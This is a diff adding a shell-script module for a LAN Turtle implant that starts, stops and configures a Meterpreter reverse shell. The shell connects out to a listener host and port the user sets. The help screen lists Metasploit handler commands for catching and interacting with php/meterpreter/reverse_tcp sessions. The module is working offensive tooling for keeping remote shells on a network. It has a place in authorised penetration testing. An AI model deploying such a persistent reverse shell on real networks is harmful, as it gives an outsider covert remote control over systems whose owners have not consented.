@@ -1,0 +1,107 @@
+#!/bin/bash /usr/lib/turtle/turtle_module
+VERSION="1.0"
+DESCRIPTION="Metasploit payload to maintain shells"
+CONF=/tmp/meterpreter.form
+
+: ${DIALOG_OK=0}
+: ${DIALOG_CANCEL=1}
+: ${DIALOG_HELP=2}
+: ${DIALOG_EXTRA=3}
+: ${DIALOG_ESC=255}
+
+function start {
+  if [ -s /etc/config/meterpreter ]
+  then
+    echo "/etc/turtle/meterpreter/executable" | at now
+    echo "Meterpreter started with pid:"
+    pidof meterpreter
+  else
+    echo "Meterpreter not configured"
+  fi
+}
+
+function stop {
+  touch /tmp/killmeterpreter
+  kill $(ps | grep [/]usr/bin/meterpreter | awk {'print $1'})
+}
+
+function status {
+  if ps | grep -q [/]usr/bin/meterpreter; then echo "1"; else echo "0"; fi
+}
+
+function configure {
+  if [ -s /etc/config/meterpreter ]
+  then
+    meterpreter_host=$(uci get meterpreter.host)
+    meterpreter_port=$(uci get meterpreter.port)
+  fi
+
+  dialog --ok-label "Submit" \
+    --help-button \
+    --title "Meterpreter Configuration" \
+    --form "Meterpreter (Metasploit Module)\n\n\
+Enter the Host and Port of the target meterpreter listener.\n \n" 14 60 2\
+    "Listen Host:"	1 1	"$meterpreter_host"	1 14 48 0 \
+    "Listen Port:"	2 1	"$meterpreter_port"	2 14 48 0 \
+  2>$CONF
+
+  return=$?
+
+  case $return in
+    $DIALOG_OK)
+      cat $CONF | { 
+        read -r meterpreter_host
+        read -r meterpreter_port
+        touch /etc/config/meterpreter
+        uci set meterpreter.host="$meterpreter_host"
+        uci set meterpreter.port="$meterpreter_port"
+        uci commit meterpreter
+        rm $CONF
+        clear
+      };;
+    $DIALOG_HELP)
+      dialog --title "Help" \
+        --msgbox "\
+Host - IP or Hostname of target meterpreter listener\n\
+Port - Port number of target meterpreter listener\n \n\
+     ,__,              For more Metasploit and Meterpreter Insight \n\
+     (oo)___           Watch Metasploit Minute with Mubix on Hak5!\n\
+     (__)    )\\        http://www.MetasploitMinute.com \n\
+        ||--|| *\n \n\
+Basic Metasploit Tips for Meterpreter Setup:\n \n\
+
+use exploit/multi/handler               \n\
+# Handles multiple meterpreter sessions\n \n\
+
+set PAYLOAD php/meterpreter/reverse_tcp \n\
+# Setting for Reverse TCP Meterpreter\n \n\
+
+set LHOST [host or ip]                  \n\
+# Hostname or IP of listener\n \n\
+
+set LPORT [port number]                 \n\
+# Port of listener\n \n\
+
+set ExitOnSession false                 \n\
+# Let the exploit continue when meterpreter exists\n \n\
+
+exploit -j                              \n\
+# Make the exploit a backgroundable job\n \n\
+
+sessions                                \n\
+# Lists sessions\n \n\
+
+sessions -i [number]                    \n\
+# Interacts with session number\n \n\
+" 20 74
+      configure
+      ;;
+    $DIALOG_CANCEL)
+      rm $CONF
+      clear
+      exit;;
+    $DIALOG_ESC)
+      clear;;
+  esac
+}
+
